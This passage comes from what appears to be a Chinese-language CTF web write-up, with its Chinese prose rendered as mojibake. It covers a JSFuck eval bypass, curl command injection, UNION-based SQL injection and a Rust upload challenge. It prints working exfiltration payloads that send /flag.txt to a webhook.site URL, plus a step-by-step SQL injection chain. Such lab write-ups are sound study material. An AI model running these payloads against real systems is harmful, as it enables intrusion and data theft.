class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.58fed7114a165282749650cf5458d31f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501145041707.png" alt="image-20230501145041707"></p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><h2 id="Migraine"><a href="#Migraine" class="headerlink" title="Migraine"></a>Migraine</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230501145238358.png" alt="image-20230501145238358"></p><p>é¢˜ç›®ç»™äº†ä¸ªæºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªjavascriptçš„å‘½ä»¤æ‰§è¡Œï¼ŒæŠŠæ•°å­—å­—æ¯å…¨ç»™è¿‡æ»¤æ‰äº†ï¼Œå°±æ˜¯æ— æ•°å­—å­—æ¯çš„rce</p><p>è¿™é‡Œçš„è¯å°±å¾—ä½¿ç”¨jsfuckè¿›è¡Œç»•è¿‡äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;https&quot;</span>).<span class="title function_">get</span>(<span class="string">&quot;https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610/?flag=&quot;</span>+process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag.txt&quot;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç å’Œ<strong>ctfshow nodejs</strong>é‡Œé¢çš„é‚£ä¸ªä¸€æ ·ï¼Œ ä¸‹æ¬¡é‡åˆ°çš„è¯å¯ä»¥è¿›è¡Œå‚è€ƒ</p><p>å¦‚ä½•è¿›è¡Œjsfuckç¼–ç ï¼Œç„¶ååˆ°é¢˜ç›®é‡Œè¿è¡Œï¼Œç„¶ååœ¨webhook.siteå°±èƒ½æ¥æ”¶åˆ°flagäº†</p><p><img src="../images/image-20230501203954385.png" alt="image-20230501203954385"></p><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230501161122636.png" alt="image-20230501161122636"></p><p>é¢˜ç›®ç»™äº†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_cmd</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&#x27;&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/curl&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    url = flask.request.form.get(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> escape_shell_cmd(url):</span><br><span class="line">        command = <span class="string">&quot;curl -s -D - -o /dev/null &quot;</span> + url + <span class="string">&quot; | grep -oP &#x27;^HTTP.+[0-9]&#123;3&#125;&#x27;&quot;</span></span><br><span class="line">        output = os.popen(command).read().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Error: No response&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Illegal Characters Detected&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯curlå‘½ä»¤ çš„ä½¿ç”¨</p><p>è¿™é‡Œå…ˆéšä¾¿æ‹¿ä¸ªé¢˜ç›®çš„ç½‘ç«™è¿›è¡Œæµ‹è¯•ï¼Œç„¶åæŠ“åŒ…</p><p><img src="../images/image-20230501185955703.png" alt="image-20230501185955703"></p><p>å‘ç°å¯ä»¥</p><p><img src="../images/image-20230501190019175.png" alt="image-20230501190019175"></p><p>ç„¶åæµ‹è¯•ä¸€ä¸‹çœ‹èƒ½å¦ä½¿ç”¨  <code>;</code>è¿›è¡Œåˆ†å‰²</p><p><img src="../images/image-20230501190123233.png" alt="image-20230501190123233"></p><p>å‘ç°å¯ä»¥</p><p>ç„¶åå°±ç”¨é¢˜ç›®ç»™çš„payloadæ¥æ‰“äº†</p><p>å…ˆç›‘å¬ç«¯å£</p><p><img src="../images/image-20230501190208427.png" alt="image-20230501190208427"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=http://localhost;curl+-d@flag.txt+https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ç”¨çš„æ˜¯ä¸“é—¨æ¥æ”¶httpè¯·æ±‚å¤´çš„ä¸€ä¸ªç½‘ç«™  <a href="https://webhook.site/">https://webhook.site/</a></p><p>è¿™é‡Œçš„è¯ç”¨è‡ªå·±çš„vpsä¸çŸ¥é“ä¸ºå•¥è¡Œä¸é€š</p><p><img src="../images/image-20230501202013603.png" alt="image-20230501202013603"></p><p>è¿™é‡Œçš„-dæ˜¯ä½¿ç”¨POSTè¯·æ±‚ï¼Œå› ä¸ºGETè¯·æ±‚çš„è¯ä¸ä¼šè¿”å›flag</p><h2 id="Lost-and-Forgotten"><a href="#Lost-and-Forgotten" class="headerlink" title="Lost and Forgotten"></a>Lost and Forgotten</h2><p>æˆ‘å¥½åƒå¿˜è®°äº†æˆ‘æœ€è¿‘å†™çš„æ–‡ç« çš„å¯†ç ã€‚è¯·é—®æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ¢å¤ã€‚</p><p><img src="../images/image-20230501202323192.png" alt="image-20230501202323192"></p><p>è€ƒå¯Ÿçš„æ˜¯sqlæ³¨å…¥</p><p><img src="../images/image-20230502150703358.png" alt="image-20230502150703358"></p><p>è¾“å…¥ä¸‹é¢çš„å†…å®¹çš„è¯ä¼šæŠŠwpå…¨éƒ¨ç»™è¾“å‡ºå‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ€€ç–‘æ˜¯ä¸æ˜¯sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸‹é¢çš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502150852836.png" alt="image-20230502150852836"></p><p>è¿”å›è¿™ç»“æœï¼Œé‚£ä¹ˆå°±è¯´æ˜äº†æ˜¯sqlæ³¨å…¥äº†ï¼Œå¹¶ä¸”åœ¨123å‡ºéƒ½æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨è¿™å‡ ä¸ªåœ°æ–¹è¿›è¡Œsqlæ³¨å…¥äº†</p><p><img src="../images/image-20230502151259631.png" alt="image-20230502151259631"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select database()),4,5,6#</span><br></pre></td></tr></table></figure><p>æŸ¥å‡ºæ•°æ®å</p><p>æ¥ç€æŸ¥è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select table_name from information_schema.tables where table_schema = &quot;writeups&quot;),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151547929.png" alt="image-20230502151547929"></p><p>æŸ¥å‡ºè¡¨åï¼Œæ¥ç€æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;articles&quot; limit 1,1),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151714536.png" alt="image-20230502151714536"></p><p>limit 1,1æŸ¥å‡ºæ¥ä¸€ä¸ªï¼Œé‚£ä¹ˆæ¥ç€å¾€åæŸ¥</p><p><img src="../images/image-20230502151807267.png" alt="image-20230502151807267"></p><p><img src="../images/image-20230502151829926.png" alt="image-20230502151829926"></p><p><img src="../images/image-20230502151844439.png" alt="image-20230502151844439"></p><p><img src="../images/image-20230502151859864.png" alt="image-20230502151859864"></p><p>æœ€å¤šèƒ½æŸ¥åˆ°limit 5,1    ä¹‹åçš„å°±æŸ¥ä¸åˆ°äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŒ¨ä¸ªå¯¹åˆ—è¿›è¡Œå†…å®¹çš„è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,access_code,4,5,6 from articles #</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502152041491.png" alt="image-20230502152041491"></p><p>æœ€åæŸ¥åˆ°åŠ å¯†åçš„flag</p><p><img src="../images/image-20230502152333647.png" alt="image-20230502152333647"></p><p>æœ€å¥½æ”¾åˆ°secret codeé‡Œé¢å°±å¯ä»¥è§£å‡ºflagäº†</p><h2 id="Web-LTO"><a href="#Web-LTO" class="headerlink" title="Web LTO"></a>Web LTO</h2><p><img src="../images/image-20230501204706377.png" alt="image-20230501204706377"></p><p><img src="../images/image-20230501204726316.png" alt="image-20230501204726316"></p><p><strong>main.rs</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_multipart::Multipart;</span><br><span class="line"><span class="keyword">use</span> actix_web::cookie::Cookie;</span><br><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, post, App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::stream::TryStreamExt;</span><br><span class="line"><span class="keyword">use</span> futures_util::StreamExt;</span><br><span class="line"><span class="keyword">use</span> rand::&#123;thread_rng, RngCore&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::hash_map::DefaultHasher;</span><br><span class="line"><span class="keyword">use</span> std::fs::create_dir_all;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;Hash, Hasher&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, SeekFrom&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>::FromStr;</span><br><span class="line"><span class="keyword">use</span> tokio::fs::&#123;remove_file, write, File, OpenOptions&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::io::AsyncReadExt;</span><br><span class="line"><span class="keyword">use</span> tokio::io::&#123;copy, AsyncSeekExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_util::io::StreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">handle_multipart</span>(user_dir: &amp;PathBuf, <span class="keyword">mut</span> multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optimised from: https://github.com/actix/examples/blob/db5f00e771573023a1d3de402f47a661c5799ec9/forms/multipart/src/main.rs#L8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">try_next</span>().<span class="keyword">await</span>? &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">16</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Too many files provided in input!&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">content_disposition</span> = field.<span class="title function_ invoke__">content_disposition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(filename) = content_disposition.<span class="title function_ invoke__">get_filename</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">            filename.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tmp</span> = PathBuf::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;tmp/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            tmp.<span class="title function_ invoke__">push</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = OpenOptions::<span class="title function_ invoke__">new</span>()</span><br><span class="line">                .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">create</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">open</span>(&amp;tmp)</span><br><span class="line">                .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">freader</span> = StreamReader::<span class="title function_ invoke__">new</span>(field.<span class="title function_ invoke__">map</span>(|result| &#123;</span><br><span class="line">                <span class="comment">// StreamReader-friendly</span></span><br><span class="line">                result.<span class="title function_ invoke__">map_err</span>(|err| std::io::Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, err))</span><br><span class="line">            &#125;))</span><br><span class="line">            .<span class="title function_ invoke__">take</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>); <span class="comment">// max file size</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> freader, &amp;<span class="keyword">mut</span> file).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// upload succeeded; copy to user area</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">destination</span> = user_dir.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                tmp.<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">                    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Must be present based on filename creation.&quot;</span>),</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// avoid overhead from open()</span></span><br><span class="line">            file.<span class="title function_ invoke__">seek</span>(SeekFrom::<span class="title function_ invoke__">Start</span>(<span class="number">0</span>)).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">orig</span> = file;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">dest</span> = File::<span class="title function_ invoke__">create</span>(&amp;destination).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> orig, &amp;<span class="keyword">mut</span> dest).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// cleanup</span></span><br><span class="line">            <span class="title function_ invoke__">drop</span>(orig);</span><br><span class="line">            <span class="title function_ invoke__">drop</span>(dest);</span><br><span class="line">            <span class="title function_ invoke__">remove_file</span>(tmp).<span class="keyword">await</span>?;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Missing filename from provided file.&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload</span>(req: HttpRequest, multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(user) = req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        user.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">user_dir</span> = PathBuf::<span class="title function_ invoke__">from</span>(<span class="built_in">format!</span>(<span class="string">&quot;user/&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line">        <span class="title function_ invoke__">create_dir_all</span>(&amp;user_dir)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = <span class="title function_ invoke__">handle_multipart</span>(&amp;user_dir, multipart).<span class="keyword">await</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">write</span>(user_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;error&quot;</span>), e.<span class="title function_ invoke__">to_string</span>()).<span class="keyword">await</span>?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tar</span> = tar::Builder::<span class="title function_ invoke__">new</span>(&amp;<span class="keyword">mut</span> body);</span><br><span class="line">        tar.<span class="title function_ invoke__">append_dir_all</span>(<span class="string">&quot;submitted&quot;</span>, user_dir)?;</span><br><span class="line">        <span class="title function_ invoke__">drop</span>(tar);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">build</span>(StatusCode::OK)</span><br><span class="line">            .<span class="title function_ invoke__">content_type</span>(<span class="string">&quot;application/tar&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">insert_header</span>((<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment&quot;</span>))</span><br><span class="line">            .<span class="title function_ invoke__">body</span>(body)</span><br><span class="line">            .<span class="title function_ 